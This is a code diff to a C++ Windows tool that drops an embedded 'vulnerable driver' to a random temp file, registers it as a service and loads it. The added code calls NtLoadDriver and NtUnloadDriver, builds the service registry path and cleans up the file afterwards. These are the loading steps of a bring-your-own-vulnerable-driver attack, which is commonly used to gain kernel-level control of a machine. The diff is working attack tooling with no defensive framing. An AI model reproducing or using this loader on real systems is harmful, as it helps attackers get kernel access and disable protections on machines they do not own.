@@ -8,9 +8,9 @@
 #include <windows.h>
 
 VulnDriverLoader::VulnDriverLoader(std::unique_ptr<BasicVulnDriver> driver)
-    : tempPath(Utils::FS::GenerateRandomTempPath(".tmp"))
+    : drvPath(Utils::FS::GenerateRandomTempPath(".tmp"))
     , driver(std::move(driver))
-    , registry(std::make_unique<ServiceRegistry>(tempPath))
+    , registry(std::make_unique<ServiceRegistry>(drvPath))
 {
 }
 
@@ -20,7 +20,7 @@ VulnDriverLoader::~VulnDriverLoader()
 
 bool VulnDriverLoader::Load()
 {
-    if (!Utils::FS::CreateFileFromMemory(tempPath, driver->GetData())) {
+    if (!Utils::FS::CreateFileFromMemory(drvPath, driver->GetData())) {
         std::println("[-] Failed to create vulnerable driver");
         return false;
     }
@@ -30,18 +30,42 @@ bool VulnDriverLoader::Load()
         return false;
     }
 
+    UNICODE_STRING svcName;
+    const auto ntPath = BuildNtPath();
+    RtlInitUnicodeString(&svcName, ntPath.c_str());
+
+    NTSTATUS status = NtLoadDriver(&svcName);
+    if (!NT_SUCCESS(status)) {
+        std::println("[-] NtLoadDriver failed: 0x{:08X}", static_cast<ULONG>(status));
+        return false;
+    }
     return true;
 }
 
 bool VulnDriverLoader::Unload()
 {
+    const auto ntPath = BuildNtPath();
+    UNICODE_STRING svcName;
+    RtlInitUnicodeString(&svcName, ntPath.c_str());
+
+    NTSTATUS status = NtUnloadDriver(&svcName);
+    if (!NT_SUCCESS(status)) {
+        std::println("[-] NtUnloadDriver failed: 0x{:08X}", static_cast<ULONG>(status));
+        return false;
+    }
+
     if (!registry->DeleteRegistryEntry()) {
         std::println("[-] Failed to delete registry entry");
         return false;
     }
 
+    return std::filesystem::remove(drvPath);
+}
 
-    return true;
+std::wstring VulnDriverLoader::BuildNtPath() const
+{
+    return L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\"
+        + drvPath.stem().wstring();
 }
 
 bool EnableLoadPrivilege()
@@ -53,7 +77,7 @@ bool EnableLoadPrivilege()
     }
 
     LUID luid;
-    if (!LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
+    if (!LookupPrivilegeValueA(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
         CloseHandle(hToken);
         std::println("[-] Failed to lookup privilege value");
         return false;
